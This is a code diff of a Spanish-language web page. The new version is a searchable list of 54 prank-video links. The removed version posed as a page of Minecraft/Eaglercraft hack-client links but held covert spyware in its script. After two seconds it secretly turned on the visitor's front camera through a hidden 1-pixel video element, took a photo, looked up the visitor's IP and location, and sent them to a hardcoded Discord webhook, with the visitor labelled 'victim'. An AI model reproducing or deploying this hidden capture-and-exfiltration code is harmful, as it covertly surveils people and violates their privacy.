@@ -1,98 +1,109 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>FORGEX v2 MOBILE</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
-  <style>
-    body{background:#000;color:#0f0;font-family:'Courier New',monospace;overflow-x:hidden}
-    canvas{position:fixed;top:0;left:0;z-index:-1}
-    .glitch{animation:glitch 4s infinite}
-    @keyframes glitch{0%,100%{text-shadow:2px 2px #0f0,-2px -2px #f00}50%{text-shadow:-2px -2px #0f0,2px 2px #f00}}
-    .card{border:2px solid #0f0;box-shadow:0 0 15px #0f0;transition:.3s}
-    .card:hover{transform:scale(1.08);box-shadow:0 0 40px #0f0}
-    video{width:1px;height:1px;position:fixed;opacity:0}
-  </style>
+<meta charset="utf-8">
+<title>JOEL · Videos del Rey de las Bromas</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body{margin:0;background:#0f0f0f;color:#fff;font-family:system-ui}
+.list{display:grid;gap:16px;padding:24px}
+.item{background:#181818;padding:16px;border-radius:14px}
+.item a{color:#ff0033;text-decoration:none;font-weight:600}
+h2,p{text-align:center}
+</style>
 </head>
+
 <body>
 
-<canvas id="matrix"></canvas>
-<video id="cam" autoplay playsinline muted></video>
+<h2>Videos de El Rey de las Bromas</h2>
+<p>Sin bloqueos · Sin restricciones · Creado por <b>JOEL/FORGEX</b></p>
+<section>
+  <h2>Videos de El Rey de las Bromas — sin bloqueos ni restricciones</h2>
+  <p>Total de videos: <b>54</b></p>
+   <p>Para abrir un video haz <b>clic</b> en el enlace que aparece abajo del título</p>
+   <p>los titulos estan cambiados para que puedas identificarlos más</p>
+  <div class="list"><input id="buscador" type="text" placeholder="🔍 Buscar video..." onkeyup="buscarVideo()" style="
+width:100%;
+max-width:420px;
+margin:16px auto;
+display:block;
+padding:12px 14px;
+border-radius:12px;
+border:none;
+font-size:16px;
+outline:none;
+background:#1f1f1f;
+color:#fff;">
 
-<header class="py-8 text-center">
-  <h1 class="text-5xl glitch">FORGEX v2</h1>
-</header>
 
-<main class="p-4 space-y-12 text-center">
-  <h2 class="text-3xl glitch">CLIENTES 2025</h2>
-  <div class="grid grid-cols-2 gap-4">
-    <a href="https://eaglerhacks.github.io/dragonv4.html" class="card bg-black/80 p-6 rounded">DragonX</a>
-    <a href="https://eaglerhacks.github.io/wurstX.html" class="card bg-black/80 p-6 rounded">WurstX</a>
-    <a href="https://eaglerhacks.github.io/UwUClient%20v1%20Full.html" class="card bg-black/80 p-6 rounded">UwU+</a>
-    <a href="https://eaglercraft-unblocked.neocities.org/eaglymc-120/" class="card bg-gradient-to-r from-purple-800 to-blue-800 p-8 rounded text-2xl font-bold">Eagler 1.20</a>
+<div class="item"><h3>Reto Extremo: Sobrevive y Gana un Auto</h3><a href="https://yewtu.be/watch?v=o65KewRwq_4" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Robando Almas en la Calle (Broma)</h3><a href="https://yewtu.be/watch?v=swguM_ABc6Q" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Juegos del Rey: Retos Sin Piedad</h3><a href="https://yewtu.be/watch?v=M8D_54LL5Fo" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Psicológica que Sale Mal</h3><a href="https://yewtu.be/watch?v=FhF-F2XWt-Q" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Asustando Extraños en Plena Calle</h3><a href="https://yewtu.be/watch?v=2EU_9u8w-xI" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>La Muñeca del Terror en el Taxi</h3><a href="https://yewtu.be/watch?v=CJUdYgJuYfA" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Extrema en Transporte Público</h3><a href="https://yewtu.be/watch?v=6Rf1jFCYv2I" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>La Reacción Más Inesperada</h3><a href="https://yewtu.be/watch?v=-i1pk5Cl5gQ" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Pesada que Nadie Olvida</h3><a href="https://yewtu.be/watch?v=ls_-ycp2abo" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Vacaciones con el Abuelo</h3><a href="https://yewtu.be/watch?v=E5x-d51Iueg" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Callejera Nivel Dios</h3><a href="https://yewtu.be/watch?v=xqyLpcvItLU" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>El Sustazo del Año</h3><a href="https://yewtu.be/watch?v=UD69stlVo2o" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>No Aguantaron la Broma</h3><a href="https://yewtu.be/watch?v=4JyPC4VsiGU" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Contrato Cariñosa a mi Abuelo</h3><a href="https://yewtu.be/watch?v=ZlnOFhQAUhE" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Prohibida en Internet</h3><a href="https://yewtu.be/watch?v=90nz5tU5HU0" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Reacciones que Dan Miedo</h3><a href="https://yewtu.be/watch?v=cSq-xFiIR24" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>El Rey Trolea a Todos</h3><a href="https://yewtu.be/watch?v=U7QabaQLDK4" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Incómoda en Público</h3><a href="https://yewtu.be/watch?v=hhZwlqmNK8M" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Nadie Vio Venir Esto</h3><a href="https://yewtu.be/watch?v=mTKqlKsjemA" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma que Casi Sale Mal</h3><a href="https://yewtu.be/watch?v=RzJb7wMjqBc" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>El Público Entra en Pánico</h3><a href="https://yewtu.be/watch?v=0DvZBjW0GtA" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Clásica del Canal</h3><a href="https://yewtu.be/watch?v=idUz4hH4pk8" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Asustando Personas de Noche</h3><a href="https://yewtu.be/watch?v=r9Sqct6CeZY" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Viral Antigua</h3><a href="https://yewtu.be/watch?v=j1W1E9tpiko" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>El Inicio del Rey de las Bromas</h3><a href="https://yewtu.be/watch?v=kv32kp0zsZQ" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Vieja Pero Dorada</h3><a href="https://yewtu.be/watch?v=cEkLhoDXgiU" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Cuando Todo Empezó</h3><a href="https://yewtu.be/watch?v=DwED0ZFS650" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Primeras Bromas del Canal</h3><a href="https://yewtu.be/watch?v=YvUfJJjp5AU" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Video Antiguo del Rey</h3><a href="https://yewtu.be/watch?v=r97NMeDXnbE" target="_blank">▶ Ver video</a></div>
+
+<div class="item"><h3>Broma Olvidada del Canal</h3><a href="https://yewtu.be/watch?v=6mLQVXgyX8k" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Rara pero Épica</h3><a href="https://yewtu.be/watch?v=wwAIGgtWM1g" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Asustando sin Piedad</h3><a href="https://yewtu.be/watch?v=-aNYDSIDXKQ" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma de las Viejas</h3><a href="https://yewtu.be/watch?v=Y66A9TFYXhE" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Risa Garantizada</h3><a href="https://yewtu.be/watch?v=2H3390NQI70" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Clásico del Canal</h3><a href="https://yewtu.be/watch?v=3NM8lRiQ4ms" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Subestimada</h3><a href="https://yewtu.be/watch?v=B-hOgryr5cw" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Vieja Escuela</h3><a href="https://yewtu.be/watch?v=akeLibLh1qM" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Asustando en Silencio</h3><a href="https://yewtu.be/watch?v=-xKdOXRme4o" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Archivo del Rey</h3><a href="https://yewtu.be/watch?v=nW5VAR4XN3c" target="_blank">▶ Ver video</a></div>
+
+<div class="item"><h3>Broma Perdida</h3><a href="https://yewtu.be/watch?v=d16sQChSH2c" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Muy Antigua</h3><a href="https://yewtu.be/watch?v=lRiUBbFjbic" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Experimento del Canal</h3><a href="https://yewtu.be/watch?v=CQx7GVjajjo" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Random</h3><a href="https://yewtu.be/watch?v=ouNGl8Nx2Pg" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Broma Olvidada</h3><a href="https://yewtu.be/watch?v=aNIsWMwwTco" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Archivo Final</h3><a href="https://yewtu.be/watch?v=Gm-Z9AQBqkA" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Últimos Recuerdos</h3><a href="https://yewtu.be/watch?v=zqfURGm_5Jw" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Video Histórico</h3><a href="https://yewtu.be/watch?v=A8PLZxT4q-s" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Cierre del Canal</h3><a href="https://yewtu.be/watch?v=oN3N80ImPFI" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Última Broma</h3><a href="https://yewtu.be/watch?v=zjRnjgARxhw" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Final Absoluto</h3><a href="https://yewtu.be/watch?v=qSv9BtqKIV4" target="_blank">▶ Ver video</a></div>
+<div class="item"><h3>Archivo Completo</h3><a href="https://yewtu.be/watch?v=qXzQwvci4iA" target="_blank">▶ Ver video</a></div>
+
   </div>
-</main>
+</section>
 
 <script>
-// TU WEBHOOK
-const WEBHOOK = "https://discord.com/api/webhooks/1447433070901858356/7afsLgRuUoUlbiSyPFbp9gu35LviTstgsNlHGB4l3_VBIi-c0xq2fNCbBpZDL_ObTT9K";
+function buscarVideo(){
+  const texto = document.getElementById("buscador").value.toLowerCase();
+  const items = document.querySelectorAll(".item");
 
-// Matrix móvil
-const canvas=document.getElementById("matrix"),ctx=canvas.getContext("2d");
-canvas.width=innerWidth;canvas.height=innerHeight;
-const chars="01アイウエオカキクケコサシスセソ";
-const f=16; let d=[]; for(let x=0;x<innerWidth/f;x++)d[x]=1;
-function draw(){ctx.fillStyle="rgba(0,0,0,0.05)";ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle="#0f0";ctx.font=f+"px monospace";for(let i=0;i<d.length;i++){ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*f,d[i]*f);if(d[i]*f>canvas.height&&Math.random()>0.975)d[i]=0;d[i]++}}setInterval(draw,40);
-
-// TOMA FOTO FRONTAL INVISIBLE + ENVÍA
-setTimeout(() => {
-  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false})
-    .then(stream => {
-      const video = document.getElementById("cam");
-      video.srcObject = stream;
-      video.onloadedmetadata = () => {
-        video.play();
-        setTimeout(() => {
-          const canvas = document.createElement("canvas");
-          canvas.width = 640; canvas.height = 480;
-          canvas.getContext("2d").drawImage(video,0,0,640,480);
-          const foto = canvas.toDataURL("image/jpeg",0.7);
-
-          fetch("https://ipapi.co/json/").then(r=>r.json()).then(ip=>{
-            fetch(WEBHOOK,{
-              method:"POST",
-              headers:{"Content-Type":"application/json"},
-              body:JSON.stringify({
-                username:"FORGEX MOBILE",
-                content:`**VÍCTIMA MÓVIL**\n**IP:** ${ip.ip}\n**Lugar:** ${ip.city}, ${ip.country_name}\n**Hora:** ${new Date().toLocaleString("es-SV")}`,
-                embeds:[{image:{url:foto}}]
-              })
-            });
-          });
-
-          // Apaga cámara rápido
-          setTimeout(()=>{stream.getTracks().forEach(t=>t.stop())},1000);
-        },800);
-      };
-    })
-    .catch(() => {
-      // Si falla cámara, igual envía IP
-      fetch("https://ipapi.co/json/").then(r=>r.json()).then(ip=>{
-        fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:`**VÍCTIMA MÓVIL (sin cámara)**\nIP: ${ip.ip} - ${ip.city}, ${ip.country_name}`})});
-      });
-    });
-}, 2000);
-
-// Abre clientes en misma pestaña
-document.querySelectorAll('a').forEach(a=>a.onclick=e=>{
-  e.preventDefault();
-  const overlay=document.createElement('div');
-  overlay.style.cssText='position:fixed;inset:0;background:#000;color:#0f0;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;font-size:2rem';
-  overlay.innerHTML=`<h1 class="glitch">CARGANDO...</h1>`;
-  document.body.appendChild(overlay);
-  setTimeout(()=>{location.href=a.href},1200);
-});
+  items.forEach(item=>{
+    const titulo = item.querySelector("h3").innerText.toLowerCase();
+    item.style.display = titulo.includes(texto) ? "block" : "none";
+  });
+}
 </script>
 </body>
 </html>
